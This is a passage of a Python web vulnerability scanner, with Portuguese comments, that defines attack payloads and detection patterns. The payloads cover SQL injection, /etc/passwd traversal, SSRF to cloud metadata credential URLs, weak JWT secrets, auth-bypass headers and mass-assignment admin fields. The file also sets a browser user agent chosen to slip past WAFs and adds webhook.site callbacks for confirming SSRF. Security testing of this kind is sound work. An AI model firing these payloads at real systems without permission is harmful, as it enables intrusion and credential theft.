POST_TEST_PATHS = [
    "/api/login", "/api/auth", "/api/token", "/api/register", "/api/users",
    "/login", "/auth", "/register", "/api/v1/login", "/api/v1/auth",
    "/api/v1/users", "/api/graphql", "/graphql", "/query", "/api/search",
    "/search", "/api/upload", "/api/user", "/oauth/token",
]

GRAPHQL_PATHS = ["/graphql", "/api/graphql", "/query", "/gql", "/v1/graphql", "/graphql/console"]

GRAPHQL_INTROSPECTION = {
    "query": "query IntrospectionQuery { __schema { queryType { name } types { name kind } } }"
}
GRAPHQL_MUTATION_INTROSPECT = {
    "query": "query { __schema { mutationType { fields { name } } } }"
}
GRAPHQL_FIELD_SUGGEST = {"query": "query { zzznonexistentfieldzzz }"}
GRAPHQL_BATCH = [{"query": "query{__typename}"} for _ in range(10)]
# mutations perigosas cujo nome, se exposto, merece destaque
GRAPHQL_DANGEROUS_MUTATIONS = re.compile(
    r"(?i)\b(createUser|deleteUser|updateUser|updateRole|setRole|grant|makeAdmin|"
    r"deleteAccount|resetPassword|changePassword|createToken|impersonate|updatePermission)\b")

# ------ JWT ------
JWT_RE = re.compile(r"eyJ[A-Za-z0-9_-]{8,}\.[A-Za-z0-9_-]{6,}\.[A-Za-z0-9_-]{0,}")
JWT_WEAK_SECRETS = [
    "", "secret", "password", "123456", "changeme", "admin", "jwt", "key", "token",
    "your-256-bit-secret", "your_jwt_secret", "jwt_secret", "jwtsecret", "secretkey",
    "supersecret", "mysecret", "test", "private", "qwerty", "s3cr3t", "default",
    "password123", "secret123", "JWTSecretKey", "MyS3cr3tK3y", "null", "0000",
    "1234567890", "shhhhh", "HS256", "app-secret", "api-secret", "sign", "signature",
]
JWT_SENSITIVE_CLAIMS = {"password", "pwd", "secret", "ssn", "credit_card", "role",
                        "roles", "is_admin", "isadmin", "admin", "email", "user_id",
                        "userid", "uid", "scope", "scopes", "authorities", "permissions"}

# ------ Auth bypass (headers e path confusion) ------
AUTH_BYPASS_HEADERS = [
    {"X-Original-URL": "/"},
    {"X-Rewrite-URL": "/"},
    {"X-Forwarded-For": "127.0.0.1"},
    {"X-Forwarded-Host": "localhost"},
    {"X-Custom-IP-Authorization": "127.0.0.1"},
    {"X-Originating-IP": "127.0.0.1"},
    {"X-Remote-IP": "127.0.0.1"},
    {"X-Client-IP": "127.0.0.1"},
    {"X-Real-IP": "127.0.0.1"},
    {"X-Forwarded-For": "127.0.0.1", "X-Forwarded-Host": "127.0.0.1"},
]
AUTH_BYPASS_SUFFIXES = ["/", "/.", "//", "/./", "/..;/", "%2e/", "?", ".json", "/~",
                        "%20", "/%2e", "..;/", ";/"]

# Campos sensiveis que indicam excessive data exposure em respostas JSON
EXCESSIVE_FIELDS = re.compile(
    r'"(password|passwd|pwd|secret|api[_-]?key|apikey|token|access[_-]?token|'
    r'refresh[_-]?token|private[_-]?key|ssn|social_security|credit_card|card_number|'
    r'cvv|pin|is_admin|isadmin|role|roles|salt|password_hash|hash|mfa_secret|'
    r'totp_secret|session_id|bank_account)"\s*:', re.I)
# Payload de mass assignment
MASS_ASSIGN_PAYLOAD = {"role": "admin", "is_admin": True, "isAdmin": True,
                       "admin": True, "isSuperuser": True, "verified": True}
# Sufixos/versoes para descobrir shadow/deprecated APIs
API_SHADOW_VERSIONS = ["v1", "v2", "v3", "v4", "v0", "internal", "beta", "alpha",
                       "dev", "test", "staging", "old", "private", "legacy", "next"]

# Raizes de API onde fazer enumeracao de recursos
API_ROOTS = ["/api", "/api/v1", "/api/v2", "/api/v3", "/rest", "/rest/v1", "/v1", "/v2",
             "/wp-json/wp/v2", "/services", "/gateway"]
# Nomes de recurso REST para enumeracao ativa de endpoints de API
API_RESOURCE_WORDLIST = [
    "users", "user", "me", "account", "accounts", "admin", "admins", "customers",
    "customer", "clients", "members", "orders", "order", "products", "product",
    "items", "cart", "carts", "checkout", "payments", "payment", "invoices",
    "transactions", "billing", "subscriptions", "plans", "config", "configs",
    "settings", "config.json", "roles", "role", "permissions", "groups", "teams",
    "organizations", "orgs", "tenants", "projects", "tokens", "token", "keys",
    "apikeys", "secrets", "sessions", "session", "auth", "oauth", "login", "logout",
    "register", "password", "reset", "profile", "profiles", "files", "file",
    "uploads", "upload", "download", "images", "media", "documents", "docs",
    "messages", "message", "notifications", "comments", "posts", "articles",
    "categories", "tags", "search", "query", "export", "import", "backup", "sync",
    "webhooks", "webhook", "jobs", "tasks", "events", "logs", "audit", "reports",
    "report", "stats", "metrics", "analytics", "health", "status", "info",
    "version", "ping", "debug", "internal", "private", "devices", "products/1",
    "users/1", "orders/1", "accounts/1", "items/1",
]

# ------ Fingerprint de tecnologias ------
# (nome, header_de_origem, regex_com_grupo_de_versao_opcional)
TECH_HEADER_FP = [
    ("nginx", "server", re.compile(r"nginx(?:/([\d.]+))?", re.I)),
    ("Apache httpd", "server", re.compile(r"Apache(?:/([\d.]+))?", re.I)),
    ("Microsoft IIS", "server", re.compile(r"Microsoft-IIS(?:/([\d.]+))?", re.I)),
    ("LiteSpeed", "server", re.compile(r"LiteSpeed", re.I)),
    ("OpenResty", "server", re.compile(r"openresty(?:/([\d.]+))?", re.I)),
    ("Caddy", "server", re.compile(r"Caddy", re.I)),
    ("Tomcat", "server", re.compile(r"(?:Apache-)?Coyote|Tomcat(?:/([\d.]+))?", re.I)),
    ("PHP", "x-powered-by", re.compile(r"PHP/([\d.]+)", re.I)),
    ("ASP.NET", "x-powered-by", re.compile(r"ASP\.NET", re.I)),
    ("ASP.NET", "x-aspnet-version", re.compile(r"([\d.]+)")),
    ("Express", "x-powered-by", re.compile(r"Express", re.I)),
    ("Next.js", "x-powered-by", re.compile(r"Next\.js", re.I)),
    ("WordPress", "x-generator", re.compile(r"WordPress\s*([\d.]+)?", re.I)),
    ("Drupal", "x-generator", re.compile(r"Drupal\s*([\d.]+)?", re.I)),
    ("Drupal", "x-drupal-cache", re.compile(r".+")),
]
TECH_COOKIE_FP = [
    ("PHP", re.compile(r"PHPSESSID", re.I)),
    ("Laravel", re.compile(r"laravel_session|XSRF-TOKEN", re.I)),
    ("Java/JSP", re.compile(r"JSESSIONID", re.I)),
    ("CodeIgniter", re.compile(r"ci_session", re.I)),
    ("ASP.NET", re.compile(r"ASP\.NET_SessionId", re.I)),
    ("Django", re.compile(r"csrftoken", re.I)),
    ("WordPress", re.compile(r"wordpress_|wp-settings", re.I)),
    ("Rails", re.compile(r"_rails|_session_id", re.I)),
]
TECH_BODY_FP = [
    ("WordPress", re.compile(r'name="generator" content="WordPress\s*([\d.]+)?', re.I)),
    ("Drupal", re.compile(r'name="[Gg]enerator" content="Drupal\s*([\d.]+)?', re.I)),
    ("Joomla", re.compile(r'name="generator" content="Joomla!?\s*-?\s*([\d.]+)?', re.I)),
    ("Shopify", re.compile(r'cdn\.shopify\.com', re.I)),
    ("Wix", re.compile(r'static\.wixstatic\.com', re.I)),
    ("jQuery", re.compile(r'jquery[-.](\d+\.\d+\.\d+)(?:\.min)?\.js', re.I)),
    ("jQuery", re.compile(r'jQuery v(\d+\.\d+\.\d+)', re.I)),
    ("Bootstrap", re.compile(r'bootstrap[-.](\d+\.\d+\.\d+)(?:\.min)?\.(?:js|css)', re.I)),
    ("AngularJS", re.compile(r'angular[.-](\d+\.\d+\.\d+)(?:\.min)?\.js', re.I)),
    ("Vue.js", re.compile(r'vue@?(\d+\.\d+\.\d+)', re.I)),
    ("React", re.compile(r'react[-.@](\d+\.\d+\.\d+)', re.I)),
    ("Lodash", re.compile(r'lodash[-.@](\d+\.\d+\.\d+)', re.I)),
    ("Moment.js", re.compile(r'moment[-.@](\d+\.\d+\.\d+)', re.I)),
]
# CVEs por versao: (tech, comparacao, cve, descricao, severidade)
# comparacao: ("<","X.Y.Z") | ("==","X.Y.Z") | ("range","a","b") | ("*",) [EOL/qualquer versao]
VULN_DB = [
    ("Apache httpd", ("==", "2.4.49"), "CVE-2021-41773", "Path traversal / RCE (mod_alias)", "CRITICAL"),
    ("Apache httpd", ("==", "2.4.50"), "CVE-2021-42013", "Path traversal / RCE (bypass do 41773)", "CRITICAL"),
    ("Apache httpd", ("<", "2.4.54"), "multiplos", "Apache desatualizado com CVEs conhecidos", "LOW"),
    ("nginx", ("<", "1.20.1"), "CVE-2021-23017", "Off-by-one no resolver DNS", "MEDIUM"),
    ("Microsoft IIS", ("<", "8.0"), "multiplos", "IIS legado com CVEs conhecidos", "LOW"),
    ("PHP", ("<", "7.4.0"), "EOL", "PHP em fim de vida (sem patches de seguranca)", "MEDIUM"),
    ("jQuery", ("<", "3.5.0"), "CVE-2020-11022/11023", "XSS via htmlPrefilter", "MEDIUM"),
    ("jQuery", ("<", "1.9.0"), "CVE-2012-6708", "XSS (selector interpretado como HTML)", "MEDIUM"),
    ("Bootstrap", ("<", "3.4.1"), "CVE-2019-8331", "XSS em tooltip/popover", "MEDIUM"),
    ("Bootstrap", ("<", "4.3.1"), "CVE-2018-14041", "XSS em data-target", "MEDIUM"),
    ("AngularJS", ("*",), "EOL", "AngularJS (1.x) em fim de vida; multiplos XSS", "MEDIUM"),
    ("Lodash", ("<", "4.17.12"), "CVE-2019-10744", "Prototype pollution", "HIGH"),
    ("Moment.js", ("<", "2.29.4"), "CVE-2022-31129", "ReDoS", "MEDIUM"),
    ("Drupal", ("<", "7.58"), "CVE-2018-7600", "Drupalgeddon2 (RCE)", "CRITICAL"),
    ("Tomcat", ("<", "9.0.35"), "multiplos", "Tomcat desatualizado (ex: Ghostcat CVE-2020-1938)", "MEDIUM"),
]

# Extensoes de backup usadas no fuzzing de arquivos conhecidos
BACKUP_EXTENSIONS = [
    ".bak", "~", ".old", ".orig", ".save", ".swp", ".swo", ".tmp", ".temp",
    ".backup", ".copy", ".1", ".2", ".txt", ".dist", ".sample", ".inc",
    ".zip", ".tar.gz", ".tar", ".gz", ".rar", ".7z",
]
# Nomes-base para fuzzing de backup na raiz
BACKUP_BASENAMES = [
    "index.php", "index.html", "config.php", "wp-config.php", "web.config",
    "app.js", "main.js", "database", "db", "backup", "site", "www", "app",
    "admin", "login.php", "config", "settings",
]

# ------ Padroes de segredos ------
SECRET_PATTERNS = [
    (re.compile(r"AKIA[0-9A-Z]{16}"), "AWS Access Key ID"),
    (re.compile(r"ASIA[0-9A-Z]{16}"), "AWS temporary Access Key"),
    (re.compile(r"(?i)aws_secret_access_key\s*[=:]\s*['\"]?[A-Za-z0-9/+=]{40}"), "AWS Secret Access Key"),
    (re.compile(r"AIza[0-9A-Za-z\-_]{35}"), "Google API Key"),
    (re.compile(r"ya29\.[0-9A-Za-z\-_]+"), "Google OAuth Token"),
    (re.compile(r"6L[0-9A-Za-z\-_]{38}"), "reCAPTCHA site key"),
    (re.compile(r"sk_live_[0-9a-zA-Z]{24,}"), "Stripe Secret Key (live)"),
    (re.compile(r"sk_test_[0-9a-zA-Z]{24,}"), "Stripe Secret Key (test)"),
    (re.compile(r"rk_live_[0-9a-zA-Z]{24,}"), "Stripe Restricted Key"),
    (re.compile(r"pk_live_[0-9a-zA-Z]{24,}"), "Stripe Publishable Key (live)"),
    (re.compile(r"gh[pousr]_[0-9A-Za-z]{36,}"), "GitHub Token"),
    (re.compile(r"github_pat_[0-9A-Za-z_]{40,}"), "GitHub Fine-grained PAT"),
    (re.compile(r"glpat-[0-9A-Za-z\-_]{20}"), "GitLab Personal Access Token"),
    (re.compile(r"xox[baprs]-[0-9A-Za-z\-]{10,}"), "Slack Token"),
    (re.compile(r"https://hooks\.slack\.com/services/[A-Za-z0-9/]+"), "Slack Webhook"),
    (re.compile(r"(?i)-----BEGIN (RSA |EC |DSA |OPENSSH |PGP )?PRIVATE KEY-----"), "Chave privada (PEM)"),
    (re.compile(r"eyJ[A-Za-z0-9_\-]{10,}\.[A-Za-z0-9_\-]{10,}\.[A-Za-z0-9_\-]{6,}"), "JWT"),
    (re.compile(r"(?i)(api[_-]?key|apikey|secret|passwd|password|token|access[_-]?token)\s*[=:]\s*['\"][^'\"]{6,}['\"]"), "Credencial em texto"),
    (re.compile(r"SG\.[0-9A-Za-z\-_]{22}\.[0-9A-Za-z\-_]{43}"), "SendGrid API Key"),
    (re.compile(r"key-[0-9a-zA-Z]{32}"), "Mailgun API Key"),
    (re.compile(r"sk-[A-Za-z0-9]{20,}"), "OpenAI/LLM API Key"),
    (re.compile(r"AC[a-z0-9]{32}"), "Twilio Account SID"),
    (re.compile(r"SK[a-z0-9]{32}"), "Twilio API Key"),
    (re.compile(r"(?i)mongodb(\+srv)?://[^\s'\"<]+"), "MongoDB connection string"),
    (re.compile(r"(?i)postgres(ql)?://[^\s'\"<]+"), "PostgreSQL connection string"),
    (re.compile(r"(?i)mysql://[^\s'\"<]+"), "MySQL connection string"),
    (re.compile(r"(?i)redis://[^\s'\"<]+"), "Redis connection string"),
    (re.compile(r"(?i)amqp://[^\s'\"<]+"), "AMQP connection string"),
    (re.compile(r"(?i)ftp://[^:\s'\"]+:[^@\s'\"]+@"), "FTP creds em URL"),
    (re.compile(r"npm_[A-Za-z0-9]{36}"), "npm token"),
    (re.compile(r"dop_v1_[a-f0-9]{64}"), "DigitalOcean token"),
    (re.compile(r"shpat_[a-fA-F0-9]{32}"), "Shopify access token"),
    (re.compile(r"shpss_[a-fA-F0-9]{32}"), "Shopify shared secret"),
    (re.compile(r"sq0atp-[0-9A-Za-z\-_]{22}"), "Square access token"),
    (re.compile(r"sq0csp-[0-9A-Za-z\-_]{43}"), "Square OAuth secret"),
    (re.compile(r"EAACEdEose0cBA[0-9A-Za-z]+"), "Facebook access token"),
    (re.compile(r"[0-9a-f]{32}-us[0-9]{1,2}"), "Mailchimp API Key"),
    (re.compile(r"xai-[A-Za-z0-9]{20,}"), "xAI API Key"),
    (re.compile(r"(?i)client_secret[\"']?\s*[:=]\s*[\"'][^\"']{8,}"), "OAuth client_secret"),
    (re.compile(r"(?i)authorization:\s*bearer\s+[A-Za-z0-9._\-]{12,}"), "Bearer token exposto"),
    (re.compile(r"(?i)ssh-rsa\s+AAAA[0-9A-Za-z+/]{100,}"), "Chave publica SSH (recon)"),
    (re.compile(r"https://hooks\.slack\.com/services/T[0-9A-Za-z_]+/B[0-9A-Za-z_]+/[0-9A-Za-z]+"), "Slack Webhook (completo)"),
    (re.compile(r"https://(?:ptb\.|canary\.)?discord(?:app)?\.com/api/webhooks/[0-9]+/[0-9A-Za-z_\-]+"), "Discord Webhook"),
    (re.compile(r"[MNO][A-Za-z\d]{23}\.[\w-]{6}\.[\w-]{27}"), "Discord Bot Token"),
    (re.compile(r"[0-9]{8,10}:[a-zA-Z0-9_-]{35}"), "Telegram Bot Token"),
    (re.compile(r"(?i)DefaultEndpointsProtocol=https;AccountName=[^;]+;AccountKey=[A-Za-z0-9+/=]{40,}"), "Azure Storage connection string"),
    (re.compile(r"(?i)AccountKey=[A-Za-z0-9+/=]{86}=="), "Azure Storage Account Key"),
    (re.compile(r'"type":\s*"service_account"'), "Google Cloud Service Account (JSON)"),
    (re.compile(r"(?i)access_token\$production\$[a-z0-9]+\$[a-f0-9]{32}"), "Square OAuth (produção)"),
    (re.compile(r"amzn\.mws\.[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}"), "Amazon MWS Auth Token"),
    (re.compile(r"(?i)paypal.*access_token\$production\$"), "PayPal Braintree token"),
    (re.compile(r"(?i)AC[a-z0-9]{32}:[a-z0-9]{32}"), "Twilio creds (SID:token)"),
    (re.compile(r"(?i)heroku[a-z0-9]{8}-[a-z0-9]{4}-[a-z0-9]{4}-[a-z0-9]{4}-[a-z0-9]{12}"), "Heroku API Key"),
    (re.compile(r"(?i)aio_[a-zA-Z0-9]{28}"), "Adafruit IO Key"),
    (re.compile(r"(?i)figd_[a-zA-Z0-9_\-]{40,}"), "Figma token"),
    (re.compile(r"(?i)ghs_[0-9A-Za-z]{36}"), "GitHub App token"),
    (re.compile(r"(?i)(?:aws_session_token|x-amz-security-token)\s*[=:]\s*['\"]?[A-Za-z0-9/+=]{100,}"), "AWS Session Token"),
    (re.compile(r"(?i)basic\s+[A-Za-z0-9+/]{16,}={0,2}"), "Credencial Basic Auth (base64)"),
    (re.compile(r"(?i)define\(\s*['\"](DB_PASSWORD|AUTH_KEY|SECURE_AUTH_KEY|NONCE_KEY)['\"]"), "Segredo wp-config.php"),
    (re.compile(r"jdbc:[a-z]+://[^\s'\"]+"), "JDBC connection string"),
    (re.compile(r"(?i)(?:sentry|glitchtip).*https://[0-9a-f]{32}@[^\s'\"]+"), "Sentry DSN"),
    (re.compile(r"[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[A-Za-z]{2,}"), "Endereco de e-mail"),
]
# Segredos que geram muito falso positivo -> so reportar em contexto de arquivo
LOW_CONFIDENCE_SECRETS = {"Endereco de e-mail", "reCAPTCHA site key",
                          "Chave publica SSH (recon)"}

# ------ Padroes de erros / stack traces ------
ERROR_PATTERNS = [
    (re.compile(r"(?i)fatal error:.*on line \d+"), "Erro fatal PHP com path"),
    (re.compile(r"(?i)warning:.*in .*\.php on line \d+"), "Warning PHP com path"),
    (re.compile(r"(?i)notice:.*in .*\.php on line \d+"), "Notice PHP com path"),
    (re.compile(r"(?i)Traceback \(most recent call last\)"), "Stack trace Python"),
    (re.compile(r"(?i)at [\w\.$]+\([\w]+\.java:\d+\)"), "Stack trace Java"),
    (re.compile(r"(?i)at [\w\.]+ \(.*:\d+:\d+\)"), "Stack trace Node.js"),
    (re.compile(r"(?i)System\.[A-Za-z.]+Exception"), "Excecao .NET"),
    (re.compile(r"(?i)Microsoft OLE DB Provider for"), "Erro SQL Server (OLE DB)"),
    (re.compile(r"(?i)You have an error in your SQL syntax"), "Erro de sintaxe MySQL"),
    (re.compile(r"(?i)Warning: mysqli?_"), "Erro MySQL (mysqli)"),
    (re.compile(r"(?i)ORA-\d{5}"), "Erro Oracle"),
    (re.compile(r"(?i)PostgreSQL.*ERROR"), "Erro PostgreSQL"),
    (re.compile(r"(?i)SQLSTATE\["), "Erro PDO/SQLSTATE"),
    (re.compile(r"(?i)Whoops, looks like something went wrong"), "Laravel debug (Whoops)"),
    (re.compile(r"(?i)Werkzeug Debugger"), "Flask/Werkzeug debugger ativo"),
    (re.compile(r"(?i)DEBUG\s*=\s*True"), "Django DEBUG=True exposto"),
    (re.compile(r"(?i)Exception Details:"), "Detalhes de excecao ASP.NET"),
    (re.compile(r"(?i)<b>Stack trace:</b>"), "Stack trace exposto (HTML)"),
    (re.compile(r"(?i)RAILS_ENV|ActionController|ActiveRecord::"), "Erro Ruby on Rails"),
    (re.compile(r"(?i)panic: .*goroutine"), "Panic Go"),
]

DIR_LISTING_PATTERN = re.compile(r"(?i)<title>Index of /|Directory listing for |<h1>Index of ")

# UA de navegador real (sem identificar o scanner -> evita bloqueio por WAF/Cloudflare).
# Use --user-agent para customizar.
DEFAULT_UA = ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
              "(KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36")

# ------ Subdomain takeover: (servico, substr_do_cname, assinatura_no_corpo) ------
TAKEOVER_FINGERPRINTS = [
    ("GitHub Pages", "github.io", "There isn't a GitHub Pages site here"),
    ("Heroku", "herokuapp.com", "No such app"),
    ("AWS S3", "s3.amazonaws.com", "NoSuchBucket"),
    ("AWS S3", "amazonaws.com", "The specified bucket does not exist"),
    ("Amazon CloudFront", "cloudfront.net", "ERROR: The request could not be satisfied"),
    ("Shopify", "myshopify.com", "Sorry, this shop is currently unavailable"),
    ("Fastly", "fastly.net", "Fastly error: unknown domain"),
    ("Pantheon", "pantheonsite.io", "The gods are wise"),
    ("Tumblr", "domains.tumblr.com", "Whatever you were looking for doesn't currently exist"),
    ("WordPress", "wordpress.com", "Do you want to register"),
    ("Ghost", "ghost.io", "The thing you were looking for is no longer here"),
    ("Surge.sh", "surge.sh", "project not found"),
    ("Bitbucket", "bitbucket.io", "Repository not found"),
    ("Zendesk", "zendesk.com", "Help Center Closed"),
    ("Unbounce", "unbounce.com", "The requested URL was not found on this server"),
    ("Webflow", "proxy-ssl.webflow.com", "The page you are looking for doesn't exist"),
    ("Netlify", "netlify.app", "Not Found - Request ID"),
    ("Read the Docs", "readthedocs.io", "unknown to Read the Docs"),
    ("Azure", "azurewebsites.net", "404 Web Site not found"),
    ("Azure", "cloudapp.azure.com", "404 Web Site not found"),
    ("Azure TrafficManager", "trafficmanager.net", ""),
    ("Help Scout", "helpscoutdocs.com", "No settings were found for this company"),
    ("Statuspage", "statuspage.io", "You are being redirected"),
    ("Tilda", "tilda.ws", "Please renew your subscription"),
    ("Cargo", "cargocollective.com", "404 Not Found"),
]

# ------ Buckets em nuvem: extrai nomes de bucket do corpo ------
CLOUD_BUCKET_PATTERNS = [
    re.compile(r"([a-z0-9][a-z0-9.\-]{2,62})\.s3\.amazonaws\.com"),
    re.compile(r"s3\.amazonaws\.com/([a-z0-9][a-z0-9.\-]{2,62})"),
    re.compile(r"([a-z0-9][a-z0-9.\-]{2,62})\.s3\.[a-z0-9\-]+\.amazonaws\.com"),
    re.compile(r"storage\.googleapis\.com/([a-z0-9][a-z0-9.\-_]{2,62})"),
    re.compile(r"([a-z0-9][a-z0-9.\-]{2,62})\.blob\.core\.windows\.net"),
]

# ------ Open redirect ------
OPEN_REDIRECT_PARAMS = ["url", "redirect", "redirect_uri", "redirect_url", "next",
                        "return", "returnUrl", "return_url", "goto", "dest",
                        "destination", "continue", "r", "u", "link", "target", "out"]
OOB_MARKER = "evil-oob-test.example.com"
OPEN_REDIRECT_PAYLOAD = "https://" + OOB_MARKER + "/"

# ------ Crawling de assets (JS) e extracao ------
JS_SRC_RE = re.compile(r'<script[^>]+src=["\']([^"\']+)["\']', re.I)
LINK_JS_RE = re.compile(r'<link[^>]+href=["\']([^"\']+\.js(?:\?[^"\']*)?)["\']', re.I)
SOURCEMAP_RE = re.compile(r'//[#@]\s*sourceMappingURL=([^\s*]+)')
ENDPOINT_RE = re.compile(r'["\'`](/(?:api|v[0-9]|rest|graphql|admin|internal|auth|user|account|oauth|token|upload|download|export|backup)[a-zA-Z0-9_\-/.{}]{1,80})["\'`]')
INTERNAL_HOST_RE = re.compile(r"\b(?:localhost|127\.0\.0\.1|10\.\d{1,3}\.\d{1,3}\.\d{1,3}|192\.168\.\d{1,3}\.\d{1,3}|172\.(?:1[6-9]|2\d|3[01])\.\d{1,3}\.\d{1,3}|[a-z0-9\-]+\.(?:internal|local|corp|intranet|lan))\b", re.I)
HTML_COMMENT_RE = re.compile(r"<!--(.*?)-->", re.S)
COMMENT_KEYWORDS = re.compile(r"(?i)\b(todo|fixme|hack|password|passwd|secret|api[_-]?key|token|username|user:|pwd|backdoor|debug|remove this|do not|internal|staging|test account|credential)\b")

# ------ Firebase ------
FIREBASE_RE = re.compile(r"([a-z0-9][a-z0-9\-]{2,})\.firebaseio\.com")
FIREBASE_CFG_RE = re.compile(r"(?:databaseURL|projectId)\s*[:=]\s*['\"]([^'\"]+)['\"]", re.I)

# ------ .well-known estendido ------
WELL_KNOWN_PATHS = [
    "/.well-known/security.txt", "/.well-known/change-password",
    "/.well-known/openid-configuration", "/.well-known/oauth-authorization-server",
    "/.well-known/assetlinks.json", "/.well-known/apple-app-site-association",
    "/.well-known/mta-sts.txt", "/.well-known/host-meta", "/.well-known/nodeinfo",
    "/.well-known/webfinger", "/.well-known/matrix/server", "/.well-known/matrix/client",
    "/.well-known/ai-plugin.json", "/.well-known/dnt-policy.txt", "/.well-known/gpc.json",
    "/.well-known/trust.txt", "/.well-known/coinbase.txt",
]

# Payloads para info disclosure baseado em erro
ERROR_PROBE_PARAMS = ["id", "q", "search", "page", "file", "path", "name", "user"]
ERROR_PROBE_VALUES = ["'", "\"", "\\", "[]", "{}", "%27", "1'\"", "../../"]

# ------ Fuzzing de parametros (por parametro individual) ------
PARAM_SQLI_PAYLOADS = ["'", "\"", "1'\"", "1')", "' OR '1'='1"]
PARAM_LFI_PAYLOADS = ["../../../../../../../etc/passwd", "/etc/passwd",
                      "....//....//....//....//etc/passwd", "..%2f..%2f..%2f..%2fetc%2fpasswd"]
LFI_SIGNATURE = re.compile(r"root:.*?:0:0:")
# nomes de parametro tipicos de redirecionamento
REDIRECT_PARAM_NAMES = {"url", "redirect", "redirect_uri", "redirect_url", "next", "return",
                        "returnurl", "return_url", "goto", "dest", "destination", "continue",
                        "u", "link", "target", "out", "to", "rurl", "redir"}
# ------ SSRF: parametros que costumam fazer fetch de URL e payloads de metadata ------
SSRF_PARAM_NAMES = {"url", "uri", "link", "src", "source", "dest", "target", "redirect",
                    "redirect_uri", "callback", "webhook", "image", "img", "image_url",
                    "imageurl", "avatar", "fetch", "load", "proxy", "site", "domain", "host",
                    "feed", "rss", "open", "page", "path", "file", "document", "download",
                    "remote", "upstream", "endpoint", "api", "next", "data", "reference", "ref"}
SSRF_PAYLOADS = [
    ("http://169.254.169.254/latest/meta-data/", "AWS metadata"),
    ("http://169.254.169.254/latest/meta-data/iam/security-credentials/", "AWS IAM creds"),
    ("http://metadata.google.internal/computeMetadata/v1/", "GCP metadata"),
    ("http://100.100.100.200/latest/meta-data/", "Alibaba metadata"),
    ("file:///etc/passwd", "file:// scheme (LFI via SSRF)"),
]
# assinaturas que confirmam que o servidor buscou o recurso interno
SSRF_SIGNATURES = re.compile(
    r"(?i)ami-id|instance-id|instance-action|iam/security-credentials|AccessKeyId|"
    r"local-ipv4|public-keys|computeMetadata|service-accounts|reservation-id|"
    r"security-groups|InstanceProfileArn|root:.*?:0:0:")

# UUID de token do webhook.site (para extrair da URL passada em --webhook)
_UUID_RE = re.compile(r"[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}", re.I)


class WebhookValidator:
    """Valida SSRF por callback OUT-OF-BAND (OOB).

    Fluxo (zero falso positivo):
      1) Para cada parametro candidato a SSRF, injeta uma URL de callback UNICA
         apontando para o webhook do usuario (ex.: webhook.site/<uuid>/<canary>).
      2) Se o servidor-alvo REALMENTE buscar essa URL, o webhook registra a
         requisicao (com o IP de saida do alvo como prova).
      3) No fim do scan, consulta a API do webhook.site e so entao cria o achado,
         correlacionando o <canary> -> (host, parametro, URL injetada).

    Sem webhook nao ha achado -> nao existe falso positivo por assinatura.
    """
    __slots__ = ("base", "host", "uuid", "api_ok", "probes", "lock", "_ctr")

    def __init__(self, raw_url):
        raw_url = (raw_url or "").strip()
        if "://" not in raw_url:
            raw_url = "https://" + raw_url
        pr = urlparse(raw_url)
        self.host = pr.netloc
        # base sem barra final; o canary vira um segmento de path adicional
        self.base = (pr.scheme + "://" + pr.netloc + pr.path).rstrip("/")
        m = _UUID_RE.search(raw_url)
        self.uuid = m.group(0) if m else None
        # coleta automatica so e suportada em webhook.site (tem API publica de requests)
        self.api_ok = ("webhook.site" in self.host) and bool(self.uuid)
        self.probes = {}          # canary -> {host, param, injected, target}
        self.lock = threading.Lock()
        self._ctr = 0

    @classmethod
    def auto(cls):
        """Cria um token novo no webhook.site e devolve um validator pronto (ou None)."""
        try:
            r = requests.post("https://webhook.site/token", json={}, timeout=20,
                              headers={"Accept": "application/json"})
            if r.status_code in (200, 201):
                uid = r.json().get("uuid")
                if uid:
                    return cls("https://webhook.site/" + uid)
        except Exception:
            pass
        return None

    def validate(self):
        """Confirma que o token existe e a API de leitura responde (200). So webhook.site."""
        if not self.api_ok:
            return None  # nao da p/ validar (coleta manual)
        try:
            api = "https://webhook.site/token/%s/requests?per_page=1" % self.uuid
            r = requests.get(api, timeout=15, headers={"Accept": "application/json"})
            return r.status_code == 200
        except Exception:
            return False

    def new_probe(self, host, param, target_url, injected_url):
        """Registra um probe e devolve (canary, callback_url) unico."""
        canary = "mcw" + "".join(random.choices(string.ascii_lowercase + string.digits, k=10))
        cb = self.base + "/" + canary
        with self.lock:
            self._ctr += 1
            self.probes[canary] = {"host": host, "param": param,
                                   "injected": injected_url, "target": target_url}
        return canary, cb

    def pending(self):
        with self.lock:
            return len(self.probes)

    def _fetch_requests(self):
        """Baixa as requisicoes registradas no token (API publica do webhook.site)."""
        if not self.api_ok:
            return None
        # per_page maximo do webhook.site e 100 (250 retorna HTTP 422)
        api = "https://webhook.site/token/%s/requests?sorting=newest&per_page=100" % self.uuid
        try:
            # NAO enviar User-Agent customizado: o webhook.site derruba a conexao
            # p/ UAs desconhecidos. Deixa o default do requests.
            r = requests.get(api, timeout=15, headers={"Accept": "application/json"})
            if r.status_code != 200:
                return None
            return r.json().get("data", [])
        except Exception:
            return None

    def collect(self, bag, wait_total=10.0):
        """Poll do webhook e criacao dos achados confirmados (chamar 1x no fim)."""
        if not self.probes:
            return 0
        if not self.api_ok:
            # nao da p/ coletar automaticamente: mostra o que checar manualmente
            p(f"{C.YELLOW}[!]{C.RESET} Coleta automatica so e suportada em webhook.site. "
              f"Verifique manualmente {self.base} pelas requisicoes recebidas.")
            return 0
        # callbacks SSRF podem atrasar; faz alguns polls dentro da janela de espera
        deadline = time.time() + max(2.0, wait_total)
        confirmed = {}
        while time.time() < deadline and len(confirmed) < len(self.probes):
            data = self._fetch_requests()
            if data:
                blob_by_req = data
                with self.lock:
                    pending_canaries = [c for c in self.probes if c not in confirmed]
                for req in blob_by_req:
                    hay = (str(req.get("url", "")) + " " +
                           str(req.get("query", "")) + " " +
                           str(req.get("content", "")))
                    for canary in pending_canaries:
                        if canary in hay and canary not in confirmed:
                            confirmed[canary] = req
            if len(confirmed) >= len(self.probes):
                break
            time.sleep(2.0)
        # cria os achados confirmados
        for canary, req in confirmed.items():
            info = self.probes.get(canary, {})
            src_ip = req.get("ip", "?")
            method = req.get("method", "GET")
            when = req.get("created_at", "")
            bag.add(Finding(
